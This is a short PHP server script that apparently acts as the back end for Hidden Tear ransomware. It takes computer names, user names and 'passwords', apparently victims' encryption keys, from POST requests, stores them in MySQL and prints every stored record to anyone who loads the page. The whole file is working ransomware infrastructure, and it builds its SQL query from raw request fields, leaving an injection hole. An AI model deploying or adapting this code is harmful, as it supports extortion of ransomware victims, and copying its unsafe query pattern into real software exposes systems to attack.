<?php
/* 
*  SERVER SIDE - BASIC EXAMPLE
*  Save the hidden tear info POST request to mysql database using PDO.
*
*/
$db = new PDO('mysql:host=localhost;dbname=testdb;charset=utf8', 'userdb', 'userdbpass');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
//connected to mysql

if(@$_POST['computerName']!=null && $_POST['userName']!=null && $_POST['password']!=null) {
	
		$computername=$_POST['computerName'];
		$username=$_POST['userName'];
		$password=$_POST['password'];
		
		try{
			//Insert the info in 'users' table (already created in the mysql server)
			$db->exec("INSERT INTO users (computername, username, password) VALUES ('".$computername."', '".$username."', '".$password."')");
		}catch(Exception $e) {
			echo 'Exception -> ';
			var_dump($e->getMessage());
		}
		
		printTable($db);
   }else{
	    printTable($db);
   }

 function printTable($db){
		$stmt = $db->query('SELECT * FROM users');
		while($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
			echo 'ID: '.$row['id'].' | Computer name: '.$row['computername'].' | User name: '.$row['username'].' | Password: '.$row['password'].'<br>';
		}
 }
?>